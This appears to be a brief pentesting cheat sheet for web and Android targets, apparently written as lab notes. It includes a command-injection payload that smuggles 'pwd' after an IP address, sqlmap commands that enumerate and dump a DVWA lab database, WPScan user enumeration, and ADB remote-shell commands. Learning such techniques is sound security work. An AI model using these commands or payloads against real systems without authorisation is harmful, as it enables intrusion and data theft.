# 🕸 Web and Android Hacking

## Tools

* SQLMap: For finding SQL Injection Vulnerabilities
* Wpscan: Scanning and Finding issues in wordpress websites
* ADB: For connecting Android devices to PC and binary analysis
* Burpsuite: For analysing and manipulating the traffic

&#x20;

## Command Injection

```
8.8.8.8;pwd
```

## SQL Injection

### SQLMap

#### Get Databases

```
sqlmap -r req.txt --dbs
```

#### Get Database Information

```
sqlmap -r req.txt -D dvwa
```

#### Get the Database Tables

```
sqlmap -r req.txt -D dvwa --tables
```

#### Get the Columns

```
sqlmap -r req.txt -D dvwa --tables --columns
```

#### Dump the information

```
sqlmap -r req.txt -D dvwa --dump
```



## WpScan

#### Help Menu

```
wpscan -h
```

#### Enumerate a website

```
wpscan --url <target url> --enumerate u
```



## ADB

#### List the Devices

```
adb devices
```

#### Connect to the Android Device

```
adb connect <ip address>:5555
```

#### Get Shell

```
adb shell
```

